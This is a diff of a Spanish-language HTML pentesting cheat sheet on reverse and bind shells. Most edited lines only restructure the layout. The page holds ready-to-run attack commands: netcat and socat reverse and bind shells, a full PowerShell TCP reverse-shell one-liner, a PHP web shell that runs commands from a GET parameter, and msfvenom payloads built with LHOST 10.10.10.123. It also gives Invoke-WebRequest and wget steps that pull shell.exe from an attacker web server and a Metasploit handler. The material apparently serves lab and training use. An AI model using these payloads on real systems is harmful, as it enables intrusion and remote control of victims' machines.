@@ -59,26 +59,29 @@
                     <li><span class="comando2">Pentestmonkey</span>:
                         <a class="enlace" href="https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet"
                             target="_blank"><span class="comando1"></span>
-                            Link de descarga</a>
+                            Link de consulta</a>
                     </li>
 
                     <li><span class="comando2">Reverse Shell Cheat Shell</span>:
                         <a class="enlace"
                             href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md"
                             target="_blank"><span class="comando1"></span>
-                            Link de descarga</a>
+                            Link de consulta</a>
                     </li>
                     <li>
-                        <span class="comando2">Repositorio Reverse Shell</span>:
-                        <a class="enlace" href="https://github.com/danielmiessler/SecLists" target="_blank">
+                        <span class="comando2">Repositorio Reverse Shell</span>:<a class="enlace"
+                            href="https://github.com/danielmiessler/SecLists" target="_blank">
                             <span class="comando1"></span>
-                            Link de descarga
+                            Link de consulta
                         </a>
                     </li>
 
 
                 </ol>
-            <li><span class="comando1"> Puertos recomendables</span>: <span class="comando4">80, 443 ó 53 </span>
+            </li>
+
+            <br>
+            <li><span class="comando1">Puertos recomendables</span>: <span class="comando4">80, 443 ó 53 </span>
                 <ol>
                     <li><span class="comando5">Estos puertos el listener debe ejecutarse con sudo, con esto puede que
                             supere las reglas del firewall.</span></li>
@@ -88,9 +91,8 @@
 
             <br>
             <br>
-            <span class="pasos">Bind y Reverse Netcat shells</span>
 
-
+            <div class="pasos">Bind y Reverse Netcat shells</div>
             <li><span class="comando1">Reverse shell</span>: La victima de conecta al atacante.
                 <ol>
                     <li><span class="comando2">Creamos el listener en la maquina atacante</span>:
@@ -128,7 +130,7 @@
 
                 <ol>
                     <li><span class="comando2">Crear una reverse shell en el target </span>:
-                        <pre><code class="language-bash line-numbers"data-start="1"
+                        <pre><code class="language-powershell line-numbers"data-start="1"
                             >nc -lvnp &lbrack;PORT&rbrack; -e "cmd.exe"</code></pre>
                     </li>
                     <li><span class="comando2">Creamos el listener en la maquina atacante</span>:
@@ -156,8 +158,10 @@
                         <pre><code class="language-bash line-numbers" style="white-space:pre-wrap;" data-start="1"
                             >nc &lbrack;TARGET&rbrack; &lbrack;PORT&rbrack; </code></pre>
                     </li>
-
-                    <li><img src="/images/powershell.png" /><span class="comando2">Cuando la maquina es Windows</span>
+                    <br>
+                    <img class="center" src="/images/powershell.png" />
+                    <div class="titulo">Powershell</div>
+                    <li><span class="comando2">Cuando la maquina es Windows</span>
 
                         <pre><code class="language-powershell line-numbers" style="white-space:pre-wrap;"data-start="1"
                             style="white-space:pre-wrap;">powershell -c "$client = New-Object System.Net.Sockets.TCPClient('&lt;ip&gt;',&lt;port&gt;);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"</code></pre>
@@ -169,8 +173,7 @@
 
             <br>
             <br>
-
-            <span class="pasos">Bind y Reverse Socat shells</span>
+            <div class="pasos">Bind y Reverse Socat shells</div>
             <li><span class="comando1">Reverse shell</span>
                 <ol>
                     <li><span class="comando2">Creamos el listener en la maquina atacante</span>:
@@ -178,14 +181,19 @@
                             >socat TCP-L:&lbrack;PORT&rbrack; -</code></pre>
 
                     </li>
-                    <li><img src="/images/tux.png" /><span class="comando2">Crear una reverse shell en el target en
+                    <br>
+                    <img class="center" src="/images/tux.png" />
+                    <div class="titulo">Linux</div>
+                    <li><span class="comando2">Crear una reverse shell en el target en
                             Linux:</span>:
                         <pre><code class="language-bash line-numbers" style="white-space:pre-wrap;" data-start="1"
                                 >socat TCP:&lbrack;TURN0&rbrack;:&lbrack;PORT&rbrack; EXEC:"bash -li"</code></pre>
 
                     </li>
-
-                    <li><img src="/images/powershell.png" /><span class="comando2">Crear una reverse shell en el target
+                    <br>
+                    <img class="center" src="/images/powershell.png" />
+                    <div class="titulo">Powershell</div>
+                    <li><span class="comando2">Crear una reverse shell en el target
                             de Windows </span>:
                         <pre><code class="language-powershell line-numbers" style="white-space:pre-wrap;" data-start="1"
                                 >socat TCP:&lbrack;TURN0&rbrack;:&lbrack;PORT&rbrack; EXEC:powershell.exe,pipes</code></pre>
@@ -197,13 +205,17 @@
             <br>
             <li><span class="comando1">Bind shell</span>
 
-                <ol>
-                    <li><img src="/images/tux.png" /><span class="comando2">Crear una reverse shell en el target en
+                <ol><img class="center" src="/images/tux.png" />
+                    <div class="titulo">Linux</div>
+                    <li><span class="comando2">Crear una reverse shell en el target en
                             linux </span>:
                         <pre><code class="language-bash line-numbers" style="white-space:pre-wrap;" data-start="1"
                                 >socat TCP-L:&lbrack;PORT&rbrack; EXEC:"bash -li"</code></pre>
                     </li>
-                    <li><img src="/images/powershell.png" /><span class="comando2">Crear una reverse shell en el target
+                    <br>
+                    <img class="center" src="/images/powershell.png" />
+                    <div class="titulo">Powershell</div>
+                    <li><span class="comando2">Crear una reverse shell en el target
                             en windows </span>:
                         <pre><code class="language-powershell line-numbers" style="white-space:pre-wrap;" data-start="1"
                                 >socat TCP-L:&lbrack;PORT&rbrack; EXEC:powershell.exe,pipes</code></pre>
@@ -218,7 +230,8 @@
 
                     <li><span class="comando5">Cuando socat no viene instalado</span></li>
 
-                    <li> <span class="comando2">Por defecto Socat no viene instalado, pero podemos cargar un precompiled
+                    <li> <span class="comando2">Por defecto Socat no viene instalado, pero podemos cargar un
+                            precompilado
                             socat binary</span>: <span class="comando4"></span>
                         <a class="enlace"
                             href="https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/socat?raw=true"
@@ -242,9 +255,7 @@
                     <li><span class="comando2">Ir a windows y abrir Powershell</span>:
                         <pre><code class="language-powershell line-numbers" style="white-space:pre-wrap;" data-start="1"
                             >Invoke-WebRequest -uri http://&lbrack;TURN0&rbrack;socat.exe -outfile C:\\Windows\temp\socat.exe</code></pre>
-                        <ol>
-                            <pre><code class="language-powershell line-numbers" style="white-space:pre-wrap;" data-start="1"> Invoke-WebRequest -uri http://10.10.10.123:80/socat -outfile C:\\Windows\temp\socat.exe</code></pre>
-                        </ol>
+                        <pre><code class="language-powershell line-numbers" style="white-space:pre-wrap;" data-start="1"> Invoke-WebRequest -uri http://10.10.10.123:80/socat -outfile C:\\Windows\temp\socat.exe</code></pre>
                     </li>
                     <li><span class="comando2">Comprobamos que se subio el archivo</span></li>
                     <li><span class="comando2">Ahora ponemos un listener con socat</span>:
@@ -260,11 +271,12 @@
 
             <br>
             <br>
-
-            <span class="pasos">WebShell <img src="/images/webpage.png" alt="web"></span>
+            <img class="center" src="/images/webpage.png" alt="web">
+            <div class="pasos">WebShell</div>
 
             <li><span class="comando1">Reverse shell</span>
                 <ol>
+                    <li><span class="comando2">Podemos generar un archivo por medio de Pentestmonkey</span></li>
                     <li><span class="comando2">Creamos un archivo llamado php-reverse-shell.php</span>:
                         <pre><code class="language-php line-numbers" style="white-space:pre-wrap;" data-start="1"
                             >&lt;?php echo "&lt;pre&gt;" . shell_exec($_GET["cmd"]) . "&lt;/pre&gt;";?&gt;</code></pre>
@@ -297,8 +309,8 @@
             </li>
             <br>
             <br>
-
-            <span class="pasos">Msfvenom </span><span class="comando3"><img src="/images/ninja.png" /></span>
+            <img class="center" src="/images/ninja.png" alt="ninja">
+            <div class="pasos">Msfvenom</div>
             <li><span class="comando1">Staged Shell</span>
                 <ol>
                     <li style="width: 95%;"><span class="comando2">Staged</span>:
@@ -328,93 +340,85 @@
                     <li><span class="comando2">Buscamos primero la shell</span>
                         <pre><code class="language-bash line-numbers" style="white-space:pre-wrap;" data-start="1"
                             >msfvenom --list payloads | grep “&lt;OS&gt;/&lt;arch&gt;/&lt;payload&gt;”</code></pre>
-                        <ol>
-                            <li><span class="comando3"><img src="/images/powershell.png" />:
-                                    <pre><code class="language-bash line-numbers" style="white-space:pre-wrap;" data-start="1"
+
+                        <br>
+                        <img class="center" src="/images/powershell.png" />
+                        <div class="titulo">Powershell</div>
+
+                        <pre><code class="language-bash line-numbers" style="white-space:pre-wrap;" data-start="1"
                                     >msfvenom --list payloads | grep “windows/x64/meterpreter/reverse_tcp” </code></pre>
 
-                            </li>
-                            <li><span class="comando3"><img src="/images/tux.png" />:
-                                    <pre><code class="language-bash line-numbers" style="white-space:pre-wrap;" data-start="1"
+                        <img class="center" src="/images/tux.png" />
+                        <div class="titulo">Linux</div>
+                        <pre><code class="language-bash line-numbers" style="white-space:pre-wrap;" data-start="1"
                                     >msfvenom --list payloads | grep “linux/x86/meterpreter_reverse_tcp" </code></pre>
-                            </li>
-                        </ol>
-                    </li>
-                    <li><span class="comando2">Configuramos la shell</span>
 
-                        <ol>
-                            <pre><code class="language-bash line-numbers" style="white-space:pre-wrap;"data-start="1"
+                </ol>
+            </li>
+            <li><span class="comando2">Configuramos la shell</span>
+
+
+                <pre><code class="language-bash line-numbers" style="white-space:pre-wrap;"data-start="1"
                                 >msfvenom -p &lbrack;PAYLOAD&rbrack; &lbrack;OPTIONS&rbrack;</code></pre>
 
-                        </ol>
-                    </li>
+            </li>
 
-                    <li><span class="comando2">Generar una reverse shell:</span>
-                        <ol>
+            <li><span class="comando2">Generar una reverse shell:</span>
 
-                            <pre><code class="language-bash line-numbers" style="white-space:pre-wrap;" data-start="1"
+                <pre><code class="language-bash line-numbers" style="white-space:pre-wrap;" data-start="1"
                                     >msfvenom -p windows/x64/shell/reverse_tcp -f exe -o shell.exe LHOST=&lbrack;TURN0&rbrack; LPORT=&lbrack;LISTE-PORT&rbrack;</code></pre>
 
 
-                            <pre><code class="language-bash line-numbers" style="white-space:pre-wrap;" data-start="1"
+                <pre><code class="language-bash line-numbers" style="white-space:pre-wrap;" data-start="1"
                                 >msfvenom -p windows/x64/shell/reverse_tcp -f exe -o shell.exe LHOST=10.10.10.123 LPORT=443</code></pre>
-                        </ol>
-                    </li>
-                    <li><span class="comando2">Subimos el archivo mediante WebServer</span>
+            </li>
+            <li><span class="comando2">Subimos el archivo mediante WebServer</span>
 
-                        <ol>
-                            <pre><code class="language-bash line-numbers" style="white-space:pre-wrap;" data-start="1"
+                <pre><code class="language-bash line-numbers" style="white-space:pre-wrap;" data-start="1"
                                     >sudo python3 -m http.server 80</code></pre>
-                        </ol>
-                    </li>
-                    <li> <span class="comando2"> Abrimos PowerShell en el target y descargamos la shell</span>
-                        <ol>
-                            <pre><code class="language-powershell line-numbers" style="white-space:pre-wrap;" data-start="1"
+            </li>
+            <li> <span class="comando2"> Abrimos PowerShell en la maquina objetivo y descargamos la shell</span>
+                <pre><code class="language-powershell line-numbers" style="white-space:pre-wrap;" data-start="1"
                                     >Invoke-WebRequest -uri http://&lbrack;TURN0&rbrack;:&lbrack;PORT&rbrack;/&lt;reverse-file&gt; -outfile C:\\Windows\temp\shell.exe</code></pre>
 
 
-                            <pre><code class="language-powershell line-numbers" style="white-space:pre-wrap;" data-start="1"
+                <pre><code class="language-powershell line-numbers" style="white-space:pre-wrap;" data-start="1"
                                 >Invoke-WebRequest -uri http://10.10.10.123:80/shell.exe -outfile C:\\Windows\temp\shell.exe</code></pre>
-                        </ol>
-                    </li>
+            </li>
 
-                    <li><span class="comando2">Abrir metasploit</span>
-                        <ol>
+            <li><span class="comando2">Abrir metasploit</span>
 
-                            <pre><code class="language-bash line-numbers" style="white-space:pre-wrap;" data-start="1"
+                <pre><code class="language-bash line-numbers" style="white-space:pre-wrap;" data-start="1"
                                 >msfconsole -q</code></pre>
-                            <pre><code class="language-bash line-numbers" style="white-space:pre-wrap;" data-start="1"
+                <pre><code class="language-bash line-numbers" style="white-space:pre-wrap;" data-start="1"
                                 >use multi/handler</code></pre>
-                            <li><span class="comando3">Configuramos el PAYLOAD, LHOST Y LPORT</span></li>
-                            <pre><code class="language-bash line-numbers" style="white-space:pre-wrap;" data-start="1"
+            <li><span class="comando3">Configuramos el PAYLOAD, LHOST Y LPORT</span></li>
+            <pre><code class="language-bash line-numbers" style="white-space:pre-wrap;" data-start="1"
                                 >set PAYLOAD &lbrack;PAYLOAD&rbrack;</code></pre>
-                            <pre><code class="language-bash line-numbers" style="white-space:pre-wrap;" data-start="1"
+            <pre><code class="language-bash line-numbers" style="white-space:pre-wrap;" data-start="1"
                                 >set LHOST &lbrack;TURN0&rbrack;</code></pre>
-                            <pre><code class="language-bash line-numbers" style="white-space:pre-wrap;" data-start="1"
+            <pre><code class="language-bash line-numbers" style="white-space:pre-wrap;" data-start="1"
                                 >set LPORT &lbrack;LISTEN-PORT&rbrack;</code></pre>
-                            <li><span class="comando3">Ejecutamos</span></li>
-                            <pre><code class="language-bash line-numbers" style="white-space:pre-wrap;" data-start="1"
+            <li><span class="comando3">Ejecutamos</span></li>
+            <pre><code class="language-bash line-numbers" style="white-space:pre-wrap;" data-start="1"
                                 >exploit -j</code></pre>
 
-                        </ol>
-                    </li>
-                    <li><span class="comando2">Nos vamos a Windows y nos metemos a la carpeta donde se almaceno la
-                            shell.exe</span>
-                        <ol>
-                            <li><span class="comando3">Damos doble click al ejecutable</span></li>
-                        </ol>
-                    </li>
-                    <li><span class="comando2">En la consola de metasploit vemos que se cargó correctamente</span></li>
-                    <li><span class="comando2">Nos dice que la session se cargo exitosamenr</span></li>
-                    <li><span class="comando2">Cargamos la session</span>
-                        <ol>
-                            <pre><code class="language-bash line-numbers" style="white-space:pre-wrap;" data-start="1"
-                                >sessions &lbrack;SESSION NUM&rbrack;</code></pre>
-                            <li><span class="comando3">Entramos a la consola de Windows</span></li>
-                        </ol>
-                    </li>
-
+            </li>
+            <li><span class="comando2">Nos vamos a Windows y nos metemos a la carpeta donde se almaceno la
+                    shell.exe</span>
+                <ol>
+                    <li><span class="comando3">Damos doble click al ejecutable</span></li>
                 </ol>
+            </li>
+            <li><span class="comando2">En la consola de metasploit vemos que se cargó correctamente</span></li>
+            <li><span class="comando2">Nos dice que la session se cargo exitosamenr</span></li>
+            <li><span class="comando2">Cargamos la session</span>
+                <pre><code class="language-bash line-numbers" style="white-space:pre-wrap;" data-start="1"
+                                >sessions &lbrack;SESSION NUM&rbrack;</code></pre>
+            <li><span class="comando3">Entramos a la consola de Windows</span></li>
+            </li>
+
+            </ol>
             </li>
 
             <br>
@@ -430,50 +434,40 @@
 
                     </li>
                     <li><span class="comando2">Configuramos la shell</span>
-                        <ol>
-                            <pre><code class="language-bash line-numbers" style="white-space:pre-wrap;" data-start="1"
+                        <pre><code class="language-bash line-numbers" style="white-space:pre-wrap;" data-start="1"
                                 >msfvenom -p &lbrack;PAYLOAD&rbrack; &lbrack;OPTIONS&rbrack; </code></pre>
 
-                        </ol>
                     </li>
                     <li><span class="comando2">Generar una reverse shell:</span>
-                        <ol>
 
-                            <pre><code class="language-bash line-numbers" style="white-space:pre-wrap;" data-start="1"
+                        <pre><code class="language-bash line-numbers" style="white-space:pre-wrap;" data-start="1"
                                     >msfvenom -p windows/x64/shell_reverse_tcp -f exe -o shell.exe LHOST=&lbrack;TURN0&rbrack; LPORT=&lbrack;LISTEN-PORT&rbrack;</code></pre>
 
-                            <pre><code class="language-bash line-numbers" style="white-space:pre-wrap;" data-start="1"
+                        <pre><code class="language-bash line-numbers" style="white-space:pre-wrap;" data-start="1"
                                         >msfvenom -p windows/x64/shell_reverse_tcp -f exe -o shell.exe LHOST=10.10.10.123 LPORT=443</code></pre>
 
-                        </ol>
                     </li>
 
                     <li><span class="comando2">Subimos el archivo mediante WebServer</span>
 
-                        <ol>
-                            <pre><code class="language-bash line-numbers" style="white-space:pre-wrap;" data-start="1"
+                        <pre><code class="language-bash line-numbers" style="white-space:pre-wrap;" data-start="1"
                                 >sudo python3 -m http.server 80</code></pre>
-                        </ol>
                     </li>
-                    <li><span class="comando2"> Abrimos PowerShell en el target y descargamos la shell</span>
-                        <ol>
-                            <pre><code class="language-powershell line-numbers" style="white-space:pre-wrap;" data-start="1"
+                    <li><span class="comando2"> Abrimos PowerShell en la maquina objetivo y descargamos la shell</span>
+                        <pre><code class="language-powershell line-numbers" style="white-space:pre-wrap;" data-start="1"
                                 >Invoke-WebRequest -uri http://&lbrack;TURN0&rbrack;:&lbrack;PORT&rbrack;/&lbrack;REVERSE-FILE&rbrack; -outfile C:\\Windows\temp\shell.exe</code></pre>
 
-                            <pre><code class="language-powershell line-numbers" style="white-space:pre-wrap;" data-start="1"
+                        <pre><code class="language-powershell line-numbers" style="white-space:pre-wrap;" data-start="1"
                                     >Invoke-WebRequest -uri http://10.10.10.123:80/shell.exe -outfile C:\\Windows\temp\shell.exe</code></pre>
 
 
-                        </ol>
 
                     </li>
 
                     <li><span class="comando2">Habilitamos el listener en nuestra maquina atacante</span>
-                        <ol>
-                            <pre><code class="language-bash line-numbers" style="white-space:pre-wrap;" data-start="1"
+                        <pre><code class="language-bash line-numbers" style="white-space:pre-wrap;" data-start="1"
                                 >nc -lvp &lbrack;PORT&rbrack; </code></pre>
 
-                        </ol>
                     </li>
                     <li><span class="comando2">Nos vamos a Windows y nos metemos a la carpeta donde se almaceno la
                             shell.exe</span>
@@ -491,8 +485,8 @@
 
             <br>
             <br>
-            <li style="width: 70%;"><span class="comando1">rlwrap</span>: pasos para generar una shell, nos da acceso al
-                historia, el
+            <li><span class="comando1">rlwrap</span>: pasos para generar una shell, nos da acceso al
+                historial, el
                 autocompletado de pestañas y teclas de flecha inmediatamente despues de recibir un shell, este tipo de
                 shell es mucho mas complejo y es tecnicamente particular cuando se trata de una Shell de Windows, que
                 son notoriamente dificiles de estabilizar.
@@ -517,7 +511,7 @@
                             >Ctrl + z </code></pre>
                     </li>
                     <li><span class="comando2">4. Ejecutar para que se apague el echo de nuesta terminal (solo cuando el
-                            target sea Linux)</span>:
+                            objetivo sea Linux)</span>:
                         <pre><code class="language-bash line-numbers" style="white-space:pre-wrap;" data-start="1"
                                 >stty raw -echo; fg </code></pre>
                     </li>
@@ -526,154 +520,125 @@
 
             <br>
             <br>
+            <div class="pasos">Tratamiento de TTY</div>
+            <br>
+            <img class="center" src="/images/python.png" />
+            <div class="titulo">Python</div>
+            <br>
 
-            <span class="pasos">Tratamiento de tty</span>
-
-            <li><span class="comando1">Python <img class="bash" src="/images/python.png" />
-                </span>
-
-                <ol>
-                    <li><span class="comando2">1. Ejecutar para generar un Shell Bash</span>:
-                        <pre><code class="language-bash line-numbers" style="white-space:pre-wrap;" data-start="1"
+            <span class="comando3">1. Ejecutar para generar un Shell Bash</span>:
+            <pre><code class="language-bash line-numbers" style="white-space:pre-wrap;" data-start="1"
                             >python -c 'import pty;pty.spawn("/bin/bash")' </code></pre>
-                        <ol>
-                            <li><span class="comando5">Nota: algunos targets neceistan especificar la version correcta
-                                    de Pyhon</span></li>
-                            <li><span class="comando5">Reemplazar la version de Pyhon por: Pyhon, Python2 ó
-                                    Python3</span></li>
+            <span class="comando5">Nota: algunos objetivos neceistan especificar la version correcta
+                de Pyhon</span>
+            <span class="comando5">Reemplazar la version de Pyhon por: Pyhon, Python2 ó
+                Python3</span>
 
-                        </ol>
-                    </li>
-                    <li><span class="comando2">2. Ejecutar para generar comando como clear</span>:
-                        <pre><code class="language-bash line-numbers" style="white-space:pre-wrap;" data-start="1"
+            <br>
+            <span class="comando2">2. Ejecutar para generar comando como clear</span>:
+            <pre><code class="language-bash line-numbers" style="white-space:pre-wrap;" data-start="1"
                             >export TERM=xterm </code></pre>
-                    </li>
-                    <li><span class="comando2">3. Ejecutar el shell en segundo plano usando el comando </span>:
-                        <pre><code class="language-bash line-numbers" style="white-space:pre-wrap;" data-start="1"
+
+            <span class="comando2">3. Ejecutar el shell en segundo plano usando el comando </span>:
+            <pre><code class="language-bash line-numbers" style="white-space:pre-wrap;" data-start="1"
                             >Ctrl + z </code></pre>
-                    </li>
-                    <li><span class="comando2">4. Renovar la terminal de segundo plano</span>:
-                        <pre><code class="language-bash line-numbers" style="white-space:pre-wrap;" data-start="1"
+
+            <span class="comando2">4. Renovar la terminal de segundo plano</span>:
+            <pre><code class="language-bash line-numbers" style="white-space:pre-wrap;" data-start="1"
                             >stty raw -echo; fg</code></pre>
 
+            <span class="comando5">Tenga en cuenta que si el Shell muere,
+                cualquier entrada en su
+                propio terminal no será visible (como resultado de haber desactivado el echo del
+                terminal).</span>
 
-                        <ol>
-                            <li style="width: 70%;"><span class="comando5">Tenga en cuenta que si el Shell muere,
-                                    cualquier entrada en su
-                                    propio terminal no será visible (como resultado de haber desactivado el echo del
-                                    terminal). </span></li>
-                            <li><span class="comando5">Solucion, escribir</span>:
-                                <pre><code class="language-bash line-numbers" style="white-space:pre-wrap;" data-start="1"
+            <span class="comando5">Solucion, escribir</span>:
+            <pre><code class="language-bash line-numbers" style="white-space:pre-wrap;" data-start="1"
                                     >reset</code></pre>
 
-                            </li>
-                        </ol>
-                    </li>
 
 
-                </ol>
-            </li>
 
-            <li><span class="comando1">Bash</span>
 
-                <img class="bash" src="/images/bash_icon.png" />
-                <ol>
-                    <li><span class="comando2">1. Ejecutar el siguiente comando </span>
-                        <ol>
-                            <pre><code class="language-bash line-numbers" style="white-space:pre-wrap;" data-start="1"
+
+            <br>
+            <img class="center" src="/images/bash_icon.png" alt="bash icon">
+            <div class="titulo">Bash</div>
+            <span class="comando2">1. Ejecutar el siguiente comando </span>
+            <pre><code class="language-bash line-numbers" style="white-space:pre-wrap;" data-start="1"
                                 >script /dev/null -c bash</code></pre>
 
-                        </ol>
-                    </li>
-                    <li><span class="comando2">2. Ejecutar la siguientes teclas </span>
-                        <ol>
-                            <pre><code class="language-bash line-numbers" style="white-space:pre-wrap;" data-start="1"
+
+            <span class="comando2">2. Ejecutar la siguientes teclas </span>
+            <pre><code class="language-bash line-numbers" style="white-space:pre-wrap;" data-start="1"
                                 >Ctrl +z</code></pre>
-                        </ol>
-                    </li>
-                    <li><span class="comando2">3. Ejecutar el siguiente comando </span>
-                        <ol>
-                            <pre><code class="language-bash line-numbers" style="white-space:pre-wrap;" data-start="1"
+
+            <span class="comando2">3. Ejecutar el siguiente comando </span>
+            <pre><code class="language-bash line-numbers" style="white-space:pre-wrap;" data-start="1"
                                 >stty -echo; fg</code></pre>
-                        </ol>
-                    </li>
 
-
-                    <li><span class="comando2">4. Ejecutar el siguiente comando </span>
-                        <ol>
-                            <pre><code class="language-bash line-numbers" style="white-space:pre-wrap;" data-start="1"
+            <span class="comando2">4. Ejecutar el siguiente comando </span>
+            <pre><code class="language-bash line-numbers" style="white-space:pre-wrap;" data-start="1"
                                 >reset</code></pre>
-                        </ol>
-                    </li>
 
-                    <li><span class="comando2">5. Nos pedira el tipo de terminal </span>
-                        <ol>
-                            <pre><code class="language-bash line-numbers" style="white-space:pre-wrap;" data-start="1"
+
+            <span class="comando2">5. Nos pedira el tipo de terminal </span>
+            <pre><code class="language-bash line-numbers" style="white-space:pre-wrap;" data-start="1"
                                 >Terminal type? Xterm</code></pre>
-                        </ol>
-                    </li>
-                    <li><span class="comando2">6. Configuramos la terminal </span>
-                        <ol>
-                            <pre><code class="language-bash line-numbers" style="white-space:pre-wrap;" data-start="1"
+
+            <span class="comando2">6. Configuramos la terminal </span>
+            <pre><code class="language-bash line-numbers" style="white-space:pre-wrap;" data-start="1"
                             >echo $TERM</code></pre>
-                            <pre><code class="language-bash line-numbers" style="white-space:pre-wrap;" data-start="1"
+            <pre><code class="language-bash line-numbers" style="white-space:pre-wrap;" data-start="1"
                             >export TERM=xterm</code></pre>
-                            <pre><code class="language-bash line-numbers" style="white-space:pre-wrap;" data-start="1"
+            <pre><code class="language-bash line-numbers" style="white-space:pre-wrap;" data-start="1"
                             >export SHELL=bash</code></pre>
-                            <pre><code class="language-bash line-numbers" style="white-space:pre-wrap;" data-start="1"
+            <pre><code class="language-bash line-numbers" style="white-space:pre-wrap;" data-start="1"
                             >echo $TERM</code></pre>
-                            <li><span class="comando4">xterm</span></li>
-
-                        </ol>
-                    </li>
-                    <li><span class="comando2">7. Configuracion de tamaño de pantalla </span>
-                        <ol>
-                            <pre><code class="language-bash line-numbers" style="white-space:pre-wrap;" data-start="1"
-                                >stty -a</code></pre>
-                            <li><span class="comando4">speed 38400 baud; rows 24; columns 80; line = 0;</span></li>
-                            <pre><code class="language-bash line-numbers" style="white-space:pre-wrap;"
-                                data-start="1">stty rows 43 columns 171</code></pre>
-
-                        </ol>
-                    </li>
-                </ol>
-            </li>
-            <li><span class="comando1">Montar un server</span>
-
-                <ol>
-
-                    <li><span class="comando2">WebServer</span>
-
-                        <ol>
-                            <pre><code class="language-bash line-numbers" style="white-space:pre-wrap;" data-start="1"
-                                >sudo python3 -m http.server 80</code></pre>
-                            <pre><code class="language-bash line-numbers" style="white-space:pre-wrap;"data-start="1"
-                                >sudo python –m SimpleHTTPServer</code></pre>
-                        </ol>
-                    </li>
-                    <li><img src="/images/powershell.png" /><span class="comando2"> Abrimos PowerShell en el target y
-                            descargamos el archivo</span>
-                        <ol>
-                            <pre><code class="language-powershell line-numbers" style="white-space:pre-wrap;"data-start="1"
-                                >Invoke-WebRequest -uri http://&lt;TURN0&gt;:&lt;PORT&gt;/&lt;reverse/file&gt; -outfile C:\\Windows\temp\shell.exe</code></pre>
-
-                            <pre><code class="language-powershell line-numbers" style="white-space:pre-wrap;"data-start="1"
-                                        >Invoke-WebRequest -uri http://10.10.10.123:80/shell.exe -outfile C:\\Windows\temp\shell.exe</code></pre>
+            <span class="comando2">7. Configuracion de tamaño de pantalla </span>
+            <pre><code class="language-bash line-numbers" style="white-space:pre-wrap;" data-start="1"
+                >stty -a</code></pre>
+            <span class="comando4">speed 38400 baud; rows 24; columns 80; line = 0;</span></li>
+            <pre><code class="language-bash line-numbers" style="white-space:pre-wrap;" data-start="1"
+                >stty rows 43 columns 171</code></pre>
 
 
 
-                        </ol>
-                    </li>
-                    <li><img src="/images/tux.png" />
-                        <span class="comando2">Linux target</span>
-                        <ol>
-                            <li><span class="comando3">En linux ejecutamos el siguiente comando</span></li>
-                            <pre><code class="language-bash line-numbers" style="white-space:pre-wrap;"data-start="1"
-                                >wget &lbrack;TURN0&rbrack;:&lbrack;PORT&rbrack;/file</code></pre>
-                        </ol>
-                    </li>
-                </ol>
-            </li>
+            <br>
+
+            <div class="pasos">Montar un Server</div>
+            <br>
+            <img class="center" src="/images/server.png" alt="Server icon">
+            <div class="titulo">WebServer</div>
+            <pre><code class="language-bash line-numbers" style="white-space:pre-wrap;" data-start="1"
+                        >sudo python3 -m http.server 80</code></pre>
+            <pre><code class="language-bash line-numbers" style="white-space:pre-wrap;"data-start="1"
+                        >sudo python –m SimpleHTTPServer</code></pre>
+
+
+
+
+            <br>
+            <img class="center" src="/images/powershell.png" alt="powershell icon">
+            <div class="titulo">PowerShell</div>
+            <span class="comando2">Descarga de archivo</span>
+
+
+            <pre><code class="language-powershell line-numbers" style="white-space:pre-wrap;"data-start="1"
+                        >Invoke-WebRequest -uri http://&lt;TURN0&gt;:&lt;PORT&gt;/&lt;reverse/file&gt; -outfile C:\\Windows\temp\shell.exe</code></pre>
+
+            <pre><code class="language-powershell line-numbers" style="white-space:pre-wrap;"data-start="1"
+                                >Invoke-WebRequest -uri http://10.10.10.123:80/shell.exe -outfile C:\\Windows\temp\shell.exe</code></pre>
+
+
+            <br>
+            <img class="center" src="/images/tux.png" alt="linux icon">
+            <div class="titulo">Linux</div>
+            <span class="comando2">Descarga de archivo</span>
+            <pre><code class="language-bash line-numbers" style="white-space:pre-wrap;"data-start="1"
+                    >wget &lbrack;TURN0&rbrack;:&lbrack;PORT&rbrack;/file</code></pre>
+
+
         </ul>
     </div>
 
